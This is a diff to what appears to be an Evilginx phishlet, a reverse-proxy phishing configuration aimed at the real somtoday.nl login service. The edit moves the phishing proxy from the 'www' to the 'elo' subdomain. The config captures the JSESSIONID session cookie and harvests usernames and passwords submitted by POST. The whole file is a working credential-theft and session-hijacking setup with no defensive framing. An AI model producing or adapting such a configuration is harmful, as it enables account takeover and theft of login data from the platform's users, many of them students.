@@ -1,11 +1,11 @@
 author: '@Jerp'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'elo', orig_sub: 'www', domain: 'somtoday.nl', session: true, is_landing: true}
+  - {phish_sub: 'elo', orig_sub: 'elo', domain: 'somtoday.nl', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'somtoday.nl', orig_sub: 'elo', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
-  - domain: 'somtoday.nl'
+  - domain: 'elo.somtoday.nl'
     keys: ['JSESSIONID=(.*).prod-authenticator-3,regexp']
 credentials:
   username:
@@ -17,5 +17,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'somtoday.nl'
+  domain: 'elo.somtoday.nl'
   path: '/login'
